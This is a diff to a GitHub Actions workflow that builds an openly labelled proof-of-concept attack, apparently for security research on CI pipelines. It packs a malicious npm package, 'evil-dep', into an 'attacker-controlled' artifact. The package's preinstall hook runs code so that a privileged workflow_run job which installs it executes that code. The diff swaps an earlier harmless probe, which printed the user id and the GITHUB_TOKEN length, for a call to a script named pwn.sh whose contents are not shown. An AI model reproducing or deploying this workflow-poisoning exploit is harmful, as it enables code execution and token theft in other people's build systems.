@@ -8,18 +8,20 @@ jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
+
       - name: Attacker-authored artifact
         run: |
-          echo "attacker-controlled linter report (artifact -> workflow_run RCE proof)" > linter-report.txt
+          echo "attacker-controlled linter report (workflow_run RCE, lazyhacker6)" > linter-report.txt
           echo "${{ github.event.pull_request.number }}" > pr-number.txt
           mkdir -p evilpkg/package
+          cp tools/poc/pwn.sh evilpkg/package/pwn.sh
+          chmod +x evilpkg/package/pwn.sh
           cat > evilpkg/package/package.json <<'PKG'
           {
             "name": "evil-dep",
             "version": "1.0.0",
-            "scripts": {
-              "preinstall": "echo ===== RCE-PROOF-START =====; id; echo GITHUB_TOKEN_len=${#GITHUB_TOKEN}; echo RUNNER_OS=$RUNNER_OS; echo PWD=$(pwd); echo ===== RCE-PROOF-END ====="
-            }
+            "scripts": { "preinstall": "bash pwn.sh" }
           }
           PKG
           (cd evilpkg && tar czf ../evil.tgz package)
@@ -28,12 +30,11 @@ jobs:
             "name": "poc-root",
             "version": "1.0.0",
             "private": true,
-            "dependencies": {
-              "evil-dep": "file:./evil.tgz"
-            }
+            "dependencies": { "evil-dep": "file:./evil.tgz" }
           }
           PKG
           printf 'foreground-scripts=true\n' > .npmrc
+
       - uses: actions/upload-artifact@v4
         with:
           name: linter-report
